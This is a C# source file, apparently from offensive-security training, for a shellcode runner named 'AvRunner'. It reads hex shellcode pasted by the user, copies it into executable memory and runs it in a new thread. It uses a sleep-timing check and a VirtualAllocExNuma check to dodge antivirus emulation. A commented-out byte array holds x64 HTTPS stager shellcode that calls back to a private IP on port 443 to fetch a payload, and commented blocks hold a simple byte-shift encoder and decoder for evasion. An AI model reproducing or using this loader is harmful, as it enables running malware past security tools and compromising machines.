using System;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net.Http.Headers;
using System.Linq;

namespace AvRunner
{
    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStacksize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            //AV Evasion, if simulator detected, do nothing


            if (t2 < 1.5)
            {
                return;
            }


            //byte[] buf = new byte[694] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,0x41,0x58,0x48,0x01,0xd0,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0x0f,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x35,0x2e,0x32,0x31,0x38,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0x8c,0x00,0x00,0x00,0x2f,0x7a,0x32,0x76,0x73,0x6e,0x69,0x63,0x43,0x6b,0x4d,0x65,0x34,0x77,0x72,0x6e,0x41,0x33,0x72,0x4c,0x2d,0x4f,0x67,0x53,0x4d,0x65,0x65,0x36,0x6f,0x75,0x35,0x4e,0x2d,0x77,0x55,0x78,0x49,0x54,0x32,0x73,0x6d,0x4c,0x34,0x6d,0x72,0x66,0x44,0x59,0x4f,0x5f,0x35,0x43,0x58,0x67,0x69,0x53,0x47,0x6d,0x32,0x71,0x61,0x54,0x37,0x71,0x4e,0x70,0x57,0x6f,0x6a,0x4f,0x33,0x6b,0x45,0x42,0x62,0x77,0x78,0x73,0x57,0x79,0x77,0x51,0x64,0x45,0x77,0x37,0x44,0x36,0x4c,0x65,0x59,0x32,0x74,0x42,0x78,0x50,0x46,0x4a,0x71,0x56,0x54,0x56,0x77,0x32,0x48,0x64,0x37,0x6c,0x72,0x37,0x4a,0x47,0x5f,0x72,0x44,0x54,0x57,0x33,0x79,0x6d,0x78,0x6e,0x6f,0x43,0x63,0x55,0x6c,0x4b,0x6d,0x64,0x63,0x67,0x6f,0x47,0x7a,0x49,0x65,0x72,0x68,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

            //Takes shellcode as user-input

            //var buf = Console.ReadLine();

            //Do bytes only perform I/O in multiples of 4 on older OS?

            char[] charsToTrim = { '{', '}', ';', ' ', '\r', '\n' };



            Console.WriteLine("Input payload size: ");
            string payload = Console.ReadLine();
            int payloadSize = Convert.ToInt32(payload);
            payloadSize = payloadSize * 5 + 1;
            double payloaddub = payloadSize * 5;

            //Double or float to int?


            Console.WriteLine("Paste Shellcode here:");
            Stream inputStream = Console.OpenStandardInput();
            Stream stdout = Console.OpenStandardOutput();

            byte[] buffer = new byte[payloadSize];
            int bytes;
            while ((bytes = inputStream.Read(buffer, 0, buffer.Length)) > 0)
            {
                stdout.Write(buffer, 0, bytes);
                //}
                int outputLength = inputStream.Read(buffer, 0, payloadSize);
                Encoding iso = Encoding.GetEncoding("ISO-8859-1");
                //char[] chars = iso.GetChars(bytes, 0, outputLength);
                char[] chars = Encoding.ASCII.GetChars(buffer);

                String sc = new String(chars).Trim(charsToTrim);
                //sc = sc.Remove(sc.Length - 1);
                string[] scsplit = sc.Split(',');

                int[] ia = scsplit.Select(x => Convert.ToInt32(x, 16)).ToArray();
                int charlen = chars.Length;
                //byte[] buf = new byte[scsplit.Length];
                //Buffer.BlockCopy(ia, 0, buf, 0, buf.Length);
                byte[] buf = ia.Select(i => (byte)i).ToArray();
                Console.WriteLine("Character Length: " + charlen);
                Console.WriteLine("Array Length: " + scsplit.Length);
                Console.WriteLine("Buf length: " + buf.Length);
                //Console.WriteLine("Character array:" + chars);
                /* foreach (char c in chars)
                 {
                     String sc = new String(chars.ToString());
                 }*/

                /*  
                  for (int i = 0; i < scsplit.Length; i++)
                  {
                      foreach (string s in scsplit)
                      {

                          int sc_dec = Convert.ToInt32(s, 16);

                          *//*Console.WriteLine("Converted to decimal: " + sc_dec);
                          Console.WriteLine("Original String: " + s);*//*

                      }
                  }*/

                /*var pair = sc.Substring(0,4);
                try
                {
                    foreach(string s in scsplit)
                    {
                        int sc_dec = Convert.ToInt32(pair, 16);
                        Console.WriteLine("Converted to decimal: " + sc_dec);
                    }
                }
                catch (FormatException exc)
                {

                    throw new FormatException($"Invalid hex {pair} at {i}");

                }*/





                /*foreach (string s in sc)
                {
                    int dec = Convert.ToInt32(s, 16);
                    Console.WriteLine("Converted to decimal: " + dec);
                }*/

                //int dec = int.Parse(sc, System.Globalization.NumberStyles.HexNumber);



                //byte[] buf = new byte[] { };

                /*foreach (byte b in bytes)
                {
                    if (b != 0)
                    {
                        //bufbuild.AppendFormat("0x{0:x2}"(b);
                        int decValue = int.Parse(sc);
                        Console.WriteLine("Bytes: " + decValue.ToString());
                    }
                }*/

                Console.WriteLine("Converted bytes: " + sc.ToString());
                //Console.WriteLine("Split bytes: " + sc.Split(','));
                Console.WriteLine("Raw output length: " + outputLength.ToString());


                /*byte[] shellcode = new byte [scsplit.Length];
                StringBuilder code = new StringBuilder();
                foreach(byte c in code)
                {
                    code.AppendFormat("0x{0:x2}, ", c);
                }
    */



                //Convert shellcode to bytes and pass into array
                //byte[] buf = new byte[scsplit.Length];
                //buf = Encoding.Default.GetBytes(chars);
                //byte[] shell = Encoding.Default.GetBytes(chars);
                //byte[] buf = new byte[scsplit.Length];

                //Console.WriteLine("Chars: " + chars.ToString());





                //Encoding Block, takes shellcode passed as user-input in above variable and passess to decoder


                /*  
                  byte[] encoded = new byte[buf.Length];
                  for (int i = 0; i < buf.Length; i++)
                  {
                      encoded[i] = (byte)(((uint)sc[i] + 5) & 0xFF);
                  }
                  StringBuilder hexenc = new StringBuilder(encoded.Length * 2);
                  foreach (byte b in encoded)
                  {
                      hexenc.AppendFormat("0x{0:x2}, ", b);
                  }
                  var hexsplit = hexenc.ToString().Split(',');
                  var hexlen = hexsplit.Length - 1;
                  Console.WriteLine("byte[] buf = new byte [" + hexlen + "] {" + hexenc.ToString() + "};");
      */

                //AV Evasion, decrypt "Helper" encryption
                /*
                            byte[] decoded = new byte[buf.Length];
                            for (int i = 0; i < hexenc.Length; i++)
                            {
                               decoded[i] = (byte)(((uint)hexenc[i] - 5) & 0xFF);

                            }
                            StringBuilder hexdec = new StringBuilder(decoded.Length * 2);
                            foreach (byte d in decoded)
                            {
                                hexdec.AppendFormat("0x{0:x2}, ", d);
                            }
                            Console.WriteLine(hexdec.ToString());*/

                //String bufout = Encoding.ASCII.GetBytes(buf);
                //String stringbyte = BitConverter.ToString(buf);
                //Console.WriteLine(stringbyte);

                int size = scsplit.Length;
                //Console.WriteLine(buf);
                Console.WriteLine("Size: " + size.ToString());



                IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

                IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);

                //AV Evasion, if emulated do nothing
                if (mem == null)
                {
                    return;
                }
                /*
                            for (int i = 0; i < scsplit.Length; i++)
                            {
                                foreach (string s in scsplit)
                                {

                                    int sc_dec = Select( s => Convert.ToInt32(s, 16)).ToArray();
                                    int[] buf = Array.ConvertAll(s, int.Parse);
                                    Marshal.Copy(buf, 0, addr, size);
                                }*/
                Marshal.Copy(buf, 0, addr, size);
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
        }
    }
}